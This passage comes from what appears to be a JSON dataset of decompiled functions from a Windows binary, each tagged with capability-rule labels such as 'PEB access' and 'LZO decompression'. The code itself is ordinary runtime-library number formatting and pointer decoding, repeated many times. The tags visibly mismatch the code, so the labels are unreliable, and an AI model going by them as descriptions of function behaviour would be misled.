*(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 461
    },
    "004461a4": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004461a4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    *(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 461
    },
    "00446261": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446261(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    *(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 460
    },
    "0044631e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044631e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    *(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 461
    },
    "004463db": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004463db(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 474
    },
    "00446465": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446465(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 474
    },
    "004464ef": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004464ef(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 474
    },
    "00446579": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446579(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 474
    },
    "00446603": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446603(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 474
    },
    "0044668d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044668d(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    puVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar4 - puVar5;\n                *(in_ECX + 0x30) = puVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar1 = (uVar1 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar1) {\n            uVar1 = (arg_10h ^ 1) * ' ' + '\\a' + uVar1;\n        }\n        *puVar5 = uVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 475
    },
    "00446717": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446717(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 491
    },
    "004467ad": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004467ad(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 491
    },
    "00446843": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446843(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 491
    },
    "004468d9": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004468d9(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 492
    },
    "0044696f": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044696f(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 492
    },
    "00446a05": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446a05(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar6;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar5;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    puVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = puVar1;\n    puVar6 = puVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = puVar1 - puVar6 >> 1;\n                *(in_ECX + 0x30) = puVar6 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar5 = (arg_8h & 0xf) + 0x30;\n        uVar2 = uVar5;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar5) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar5;\n        }\n        *puVar6 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        puVar6 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 492
    },
    "0046f739": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046f739(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint var_ch;\n    char *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = arg_ch;\n    if (arg_18h != '\\0') {\n        *arg_ch = '-';\n        var_8h = arg_ch + 1;\n        arg_8h = -arg_8h;\n    }\n    var_4h = arg_18h != '\\0';\n    pcVar3 = var_8h;\n    do {\n        pcVar6 = pcVar3;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h / arg_14h;\n        *pcVar6 = (-(9 < uVar2 % arg_14h) & 0x27U) + 0x30 + uVar2 % arg_14h;\n        var_4h = var_4h + 1;\n        if (arg_8h == 0) break;\n        pcVar3 = pcVar6 + 1;\n    } while (var_4h < arg_10h);\n    if (var_4h < arg_10h) {\n        pcVar6[1] = '\\0';\n        do {\n            cVar1 = *pcVar6;\n            *pcVar6 = *var_8h;\n            pcVar6 = pcVar6 + -1;\n            *var_8h = cVar1;\n            var_8h = var_8h + 1;\n        } while (var_8h < pcVar6);\n        uVar5 = 0;\n    }\n    else {\n        *arg_ch = '\\0';\n        puVar4 = fcn.0043bcb5();\n        uVar5 = 0x22;\n        *puVar4 = 0x22;\n        fcn.0043bb3e();\n    }\n    return uVar5;\n}\n",
        "token_count": 495
    },
    "0046f7e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046f7e0(uint32_t arg_8h, int16_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    uint64_t uVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uint var_ch;\n    int16_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = arg_ch;\n    if (arg_18h != '\\0') {\n        *arg_ch = 0x2d;\n        var_8h = arg_ch + 1;\n        arg_8h = -arg_8h;\n    }\n    var_4h = arg_18h != '\\0';\n    piVar3 = var_8h;\n    do {\n        piVar6 = piVar3;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h / arg_14h;\n        *piVar6 = (-(9 < uVar2 % arg_14h) & 0x27) + 0x30 + uVar2 % arg_14h;\n        var_4h = var_4h + 1;\n        if (arg_8h == 0) break;\n        piVar3 = piVar6 + 1;\n    } while (var_4h < arg_10h);\n    if (var_4h < arg_10h) {\n        piVar6[1] = 0;\n        do {\n            iVar1 = *piVar6;\n            *piVar6 = *var_8h;\n            piVar6 = piVar6 + -1;\n            *var_8h = iVar1;\n            var_8h = var_8h + 1;\n        } while (var_8h < piVar6);\n        uVar5 = 0;\n    }\n    else {\n        *arg_ch = 0;\n        puVar4 = fcn.0043bcb5();\n        uVar5 = 0x22;\n        *puVar4 = 0x22;\n        fcn.0043bb3e();\n    }\n    return uVar5;\n}\n",
        "token_count": 508
    },
    "0043b6d9": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043b6d9(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 95
    },
    "0043bac1": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bac1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    \n    iVar1 = *arg_1ch;\n    if (((iVar1 == 0) && (iVar1 = fcn.0043b84d(),  iVar1 == 0)) || (pcVar4 = *(iVar1 + 0x35c),  pcVar4 == NULL)) {\n        iVar1 = fcn.0043b7f7();\n        uVar2 = *0x6cade0 & 0x1f;\n        uVar3 = *(iVar1 * 4 + 0x6ccc70) ^ *0x6cade0;\n        pcVar4 = uVar3 >> uVar2 | uVar3 << 0x20 - uVar2;\n        if (pcVar4 == NULL) {\n            fcn.0043bb6b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n    }\n    (**0x47b3f8)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 337
    },
    "0043bb9f": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043bb9f(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *0x6cade0;\n    uVar3 = *0x6ccc70 ^ *0x6cade0;\n    *0x6ccc70 = fcn.0043b6f4(arg_8h);\n    uVar2 = uVar1 & 0x1f;\n    return uVar3 >> uVar2 | uVar3 << 0x20 - uVar2;\n}\n",
        "token_count": 138
    },
    "0045659d": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045659d(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "00456937": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
